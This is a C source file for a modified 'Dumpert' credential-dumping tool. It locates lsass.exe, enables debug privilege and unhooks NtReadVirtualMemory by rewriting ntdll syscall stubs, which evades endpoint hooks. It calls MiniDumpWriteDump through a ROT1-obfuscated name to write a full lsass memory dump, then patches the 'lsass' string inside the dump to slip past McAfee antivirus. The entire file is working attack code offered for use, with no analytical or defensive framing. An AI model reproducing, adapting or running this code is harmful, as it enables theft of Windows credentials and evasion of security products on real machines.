#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "Dumpert.h"
#include <DbgHelp.h>


#pragma comment (lib, "Dbghelp.lib")


//FBK

char* MyEncrypt(char* input, int key){
	//char* output = (char*)calloc(1, sizeof(input));
	char* output;
	output = malloc(strlen(input)*sizeof(char));

	int keysave = key;

	for (int n = 0, len = strlen(input); n < len; n++)
	{
		int currentLetter = input[n];
		char cipher = currentLetter + key;

		if ((currentLetter - 'a') + key > 26)
		{
			key = ((currentLetter - 'a') + key) % 26;
			cipher = 'a' + key;
		}
		output[n] = cipher;
		//kprintf(L"%d : %c\n", n,output[n]);
		//kprintf(L"%s \n", output);

		// reset the key and do the next letter
		key = keysave;
	}
	return output;
}

void DumpHex(const void* data, size_t size, int address) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	printf("%08X  |  ", address);
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			printf(" ");
			if ((i + 1) % 16 == 0) {
				printf("|  %s \n", ascii);
				printf("%08X  |  ", address+i+1);

			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

char *find_str_in_data(const char *str, const char *data, int length)
{
	int pos = 0;
	int slen = strlen(str);
	int datalen = strlen(data);
	int diff = length - slen;

	int i = 0;
	while (pos < (length - slen))
	{
		pos++;
		i = 0;

		while (i < slen && str[i] == data[pos + i])
		{
			i++;
		}
		if (i == slen) {
			return data + pos;
		}
	}
	return NULL;
}



BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
	BYTE AssemblyBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0xFF};

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
	}
	else {
		return FALSE;
	}

	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);

	//printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
	//printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
	//printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);

	LPVOID lpBaseAddress = lpProcAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = 10;
	NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		//wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		wprintf(L"failed.\n");

		return FALSE;
	}
	
	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
	if (status != STATUS_SUCCESS) {
		//wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
		wprintf(L"failed.\n");
		return FALSE;
	}

	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		//wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		wprintf(L"failed.\n");
		return FALSE;
	}




	return TRUE;
}

BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
	pWinVerInfo->hTargetPID = NULL;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
	}
	else {
		return FALSE;
	}

	ULONG uReturnLength = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!status == 0xc0000004) {
		return FALSE;
	}

	LPVOID pBuffer = NULL;
	SIZE_T uSize = uReturnLength;
	status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0) {
		return FALSE;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != 0) {
		return FALSE;
	}

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");
	if (RtlEqualUnicodeString == NULL) {
		return FALSE;
	}

	PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
			break;
		}
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

	} while (pProcInfo);

	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);

	if (pWinVerInfo->hTargetPID == NULL) {
		return FALSE;
	}

	return TRUE;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {
	//wprintf(L" ________          __    _____.__                 __				\n");
	//wprintf(L" \\_____  \\  __ ___/  |__/ ____\\  | _____    ____ |  | __		\n");
	//wprintf(L"  /   |   \\|  |  \\   __\\   __\\|  | \\__  \\  /    \\|  |/ /	\n");
	//wprintf(L" /    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <		\n");
	//wprintf(L" \\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\		\n");
	//wprintf(L"         \\/                             \\/     \\/     \\/		\n");
	//wprintf(L"                           D u m p e r t	 modified version		\n");

	LPCWSTR lpwProcName = L"lsass.exe";


	
	if (sizeof(LPVOID) != 8) {
		//wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
		wprintf(L"failed not x64\n");

		exit(1);
	}

	if (!IsElevated()) {
		wprintf(L"[!] You need elevated privileges to run this tool!\n");
		exit(1);
	}

	SetDebugPrivilege();

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// First set OS Version/Architecture specific values
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

	wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	// Now create os/build specific syscall function pointers.
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = L"10 or Server 2016";
		wprintf(L"	[+] OS is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		ZwOpenProcess = &ZwOpenProcess10;
		NtCreateFile = &NtCreateFile10;
		ZwClose = &ZwClose10;
		pWinVerInfo->SystemCall = 0x3F;
		//FBK
		NtReadFile = &NtReadFile10;
		NtWriteFile = &NtWriteFile10;

	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
		lpOSVersion = L"7 SP1 or Server 2008 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		ZwOpenProcess = &ZwOpenProcess7SP1;
		NtCreateFile = &NtCreateFile7SP1;
		ZwClose = &ZwClose7SP1;
		pWinVerInfo->SystemCall = 0x3C;
		//FBK
		NtReadFile = &NtReadFile7SP1;
		NtWriteFile = &NtWriteFile7SP1;


	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		lpOSVersion = L"8 or Server 2012";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		ZwOpenProcess = &ZwOpenProcess80;
		NtCreateFile = &NtCreateFile80;
		ZwClose = &ZwClose80;
		pWinVerInfo->SystemCall = 0x3D;
		
		NtReadFile = &NtReadFile80;
		NtWriteFile = &NtWriteFile80;

	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		lpOSVersion = L"8.1 or Server 2012 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		ZwOpenProcess = &ZwOpenProcess81;
		NtCreateFile = &NtCreateFile81;
		ZwClose = &ZwClose81;
		pWinVerInfo->SystemCall = 0x3E;
		
		NtReadFile = &NtReadFile81;
		NtWriteFile = &NtWriteFile81;

	}
	else {
		wprintf(L"	[!] OS Version not supported.\n\n");
		exit(1);
	}

	wprintf(L"[2] Checking Process details:\n");

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);

	if (!GetPID(pWinVerInfo)) {
		wprintf(L"	[!] Enumerating process failed.\n");
		exit(1);
	}

	wprintf(L"	[+] Process ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
	pWinVerInfo->lpApiCall = "NtReadVirtualMemory";

	if (!Unhook_NativeAPI(pWinVerInfo)) {
		printf("	[!] Unh00king %s failed.\n", pWinVerInfo->lpApiCall);
		exit(1);
	}

	wprintf(L"[3] Create mem dump file:\n");

	wprintf(L"	[+] Open a process handl3.\n");
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = pWinVerInfo->hTargetPID;
	uPid.UniqueThread = (HANDLE)0;

	NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		wprintf(L"	[!] Failed to get pr0cesshandle.\n");
		exit(1);
	}

	WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
	WCHAR chWinPath[MAX_PATH];
	GetWindowsDirectory(chWinPath, MAX_PATH);
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\mydump.bin");

	UNICODE_STRING uFileName;
	RtlInitUnicodeString(&uFileName, chDmpFile);

	wprintf(L"	[+] Dump %wZ mem0ry to: %wZ\n", pWinVerInfo->ProcName, uFileName);
	
	HANDLE hDmpFile = NULL;

	IO_STATUS_BLOCK IoStatusBlock;
	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	OBJECT_ATTRIBUTES FileObjectAttributes;
	InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//  Open input file for writing, overwrite existing file.
	status = NtCreateFile(&hDmpFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (hDmpFile == INVALID_HANDLE_VALUE) {
		wprintf(L"	[!] Failed t0 create dumpfile.\n");
		ZwClose(hProcess);
		exit(1);
	}
	typedef BOOL (WINAPI *mafonction) (_In_ HANDLE hProcess,	_In_ DWORD ProcessId, _In_ HANDLE hFile,_In_ MINIDUMP_TYPE DumpType, _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
		_In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam );

	HINSTANCE lib_handle;
	lib_handle = LoadLibrary(TEXT("dbghelp.dll"));

	mafonction mydumpfonction = (mafonction)GetProcAddress(lib_handle, MyEncrypt("LhmhCtloVqhsdCtlo", 1)); //MiniDumpWriteDump with ROT1

	DWORD dwTargetPID = GetProcessId(hProcess);

	if (!mydumpfonction) {
		wprintf(L"	[!] Wrong Return of Address of my supposed to be hidden function!\n");
		exit(1);
	}


	BOOL Success = mydumpfonction(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if ((!Success)) {
		wprintf(L"	[!] Failed t0 create minidump, err0r c0de: %x\n", GetLastError());
	} 
	else {
		wprintf(L"	[+] Dump succesful.\n");
	}

	Sleep(1000);
	
	LARGE_INTEGER      byteOffset;


	unsigned char szBuffer[2048];
	char *s;
	BOOL found = FALSE;
	ULONG readSize = 2048;
	char McAfeeString[] = { 'l', 's', 'a', 's', 's' };

	ZeroMemory(&szBuffer, 2048);

	wprintf(L"[4] Read Dump File\n");
	byteOffset.LowPart = byteOffset.HighPart = 0;
	while (!found) {
		status = NtReadFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
		if (status == STATUS_SUCCESS) {
			s = find_str_in_data(McAfeeString, szBuffer, readSize);
			if ((s != NULL) || ( byteOffset.LowPart >= 40000)){
				found = TRUE;
				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
				szBuffer[s - szBuffer]     = 'm';
				szBuffer[s - szBuffer + 1] = 'c';
				szBuffer[s - szBuffer + 2] = 'a';
				szBuffer[s - szBuffer + 3] = 'f';
				szBuffer[s - szBuffer + 4] = 'f';
				wprintf(L"	[+] McAfee AV bypass. Replacing string at address %08X\n", s - szBuffer + byteOffset.LowPart);
				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
				wprintf(L"	[+] Rewriting Dump File\n");
				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
				
			}

			byteOffset.LowPart += readSize;

		}
		else {
			wprintf(L"	[-] Failed to read dump file.\n");

		}
	}

	ZwClose(hDmpFile);
	ZwClose(hProcess);

	return 0;
}
